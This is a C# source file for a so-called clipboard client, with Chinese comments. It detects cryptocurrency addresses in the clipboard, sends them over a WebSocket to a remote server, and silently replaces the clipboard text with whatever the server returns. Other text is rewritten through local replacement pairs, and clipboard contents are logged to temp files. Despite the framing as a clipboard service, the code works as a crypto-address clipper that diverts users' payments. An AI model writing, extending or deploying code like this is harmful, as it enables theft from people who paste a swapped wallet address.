using System.Security.Cryptography;
using System.Text;

namespace ClipboardClient;

internal sealed class ClipboardService
{
    private readonly AppConfig _config;
    private readonly string _deviceId;
    private long _seq;
    private DateTime _suppressUntil = DateTime.MinValue;
    private string _lastWrittenHash = string.Empty;
    private bool _lastContentWasAddress = false;

    public ClipboardService(AppConfig config, string deviceId)
    {
        _config = config;
        _deviceId = deviceId;
    }

    public bool ApplyingMutation { get; private set; }

    public void OnClipboardUpdate()
    {
        if (ApplyingMutation) return;
        if (!TrySnapshotText(out var text, out var bytes)) return;
        
        // 应用替换对
        var replacedText = ReplacementPairManager.ApplyReplacements(text);
        if (replacedText != text)
        {
            // 如果发生了替换，立即更新剪贴板
            ApplyingMutation = true;
            try
            {
                TrySetClipboardTextWithRetry(replacedText);
                _lastWrittenHash = "sha256:" + ComputeSha256(Encoding.UTF8.GetBytes(replacedText));
                _suppressUntil = DateTime.UtcNow.AddMilliseconds(_config.SuppressMs);
                
                // 记录替换日志
                File.AppendAllText(
                    Path.Combine(Path.GetTempPath(), "clipboard-replacements.log"),
                    $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] 自动替换完成: {text} -> {replacedText}\r\n"
                );
            }
            finally
            {
                ApplyingMutation = false;
            }
            return;
        }
        
        var hash = "sha256:" + ComputeSha256(bytes);

        if (hash == _lastWrittenHash && DateTime.UtcNow < _suppressUntil) return;

        // 检测是否为加密货币地址
        var (addressType, isAddress) = CryptoAddressDetector.DetectAddress(text);
        
        ClipboardChangeEvent evt;
        
        if (isAddress)
        {
            // 如果是地址，发送完整内容和地址类型
            evt = new ClipboardChangeEvent
            {
                DeviceId = _deviceId,
                Seq = Interlocked.Increment(ref _seq),
                Ts = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
                Formats = new[] { "text/plain" },
                Preview = text.Length > 200 ? text.Substring(0, 200) : text,
                Hash = hash,
                Payload = new ClipboardPayload { Text = text },
                AddressType = CryptoAddressDetector.GetAddressTypeName(addressType)
            };
            _lastContentWasAddress = true;
        }
        else
        {
            // 如果不是地址，只在状态改变时发送清空信号
            if (_lastContentWasAddress)
            {
                evt = new ClipboardChangeEvent
                {
                    DeviceId = _deviceId,
                    Seq = Interlocked.Increment(ref _seq),
                    Ts = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds(),
                    Formats = new[] { "text/plain" },
                    Preview = "[CLEAR]",
                    Hash = hash,
                    Payload = new ClipboardPayload { Text = "" },
                    IsClearSignal = true
                };
                _lastContentWasAddress = false;
            }
            else
            {
                // 如果上次也不是地址，不发送任何东西
                return;
            }
        }

        var cts = new CancellationTokenSource(_config.AwaitMutationTimeoutMs + 200);
        _ = HandleEventAsync(evt, cts.Token);
    }

    private async Task HandleEventAsync(ClipboardChangeEvent evt, CancellationToken ct)
    {
        var mut = await WebSocketManager.Instance.SendEventAndAwaitAsync(evt, _config.AwaitMutationTimeoutMs, ct);
        if (mut == null) return;
        if (!string.Equals(mut.ExpectedHash, evt.Hash, StringComparison.OrdinalIgnoreCase)) return;
        var nowMs = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds();
        if (nowMs > mut.Deadline) return;

        if (string.Equals(mut.Set.Format, "text/plain", StringComparison.OrdinalIgnoreCase) && !string.IsNullOrEmpty(mut.Set.Text))
        {
            ApplyingMutation = true;
            try
            {
                TrySetClipboardTextWithRetry(mut.Set.Text);
                if (mut.SuppressReport)
                {
                    _lastWrittenHash = "sha256:" + ComputeSha256(Encoding.UTF8.GetBytes(mut.Set.Text));
                    _suppressUntil = DateTime.UtcNow.AddMilliseconds(_config.SuppressMs);
                }
            }
            finally
            {
                ApplyingMutation = false;
            }
        }
    }

    private static bool TrySnapshotText(out string text, out byte[] bytes)
    {
        text = string.Empty;
        bytes = Array.Empty<byte>();
        try
        {
            if (!Clipboard.ContainsText()) return false;
            text = Clipboard.GetText();
            bytes = Encoding.UTF8.GetBytes(text);
            return true;
        }
        catch
        {
            return false;
        }
    }

    private static string ComputeSha256(byte[] bytes)
    {
        using var sha = SHA256.Create();
        var hash = sha.ComputeHash(bytes);
        return Convert.ToHexString(hash).ToLowerInvariant();
    }

    private static void TrySetClipboardTextWithRetry(string text)
    {
        var delay = 25;
        for (int i = 0; i < 8; i++)
        {
            try
            {
                Clipboard.SetText(text);
                return;
            }
            catch
            {
                Thread.Sleep(delay);
                delay = Math.Min(250, delay * 2);
            }
        }
    }
}


internal static class ClipboardPush
{
    public static void ApplyExternalSet(string text)
    {
        try
        {
            // 清空剪贴板并设置新文本
            Clipboard.Clear();
            Clipboard.SetText(text);
            
            // 记录日志用于调试
            File.AppendAllText(
                Path.Combine(Path.GetTempPath(), "clipboard-push.log"),
                $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] 推送内容: {text}\r\n"
            );
        }
        catch (Exception ex)
        {
            // 记录错误日志
            File.AppendAllText(
                Path.Combine(Path.GetTempPath(), "clipboard-push.log"),
                $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] 推送失败: {ex.Message}\r\n"
            );
        }
    }
}

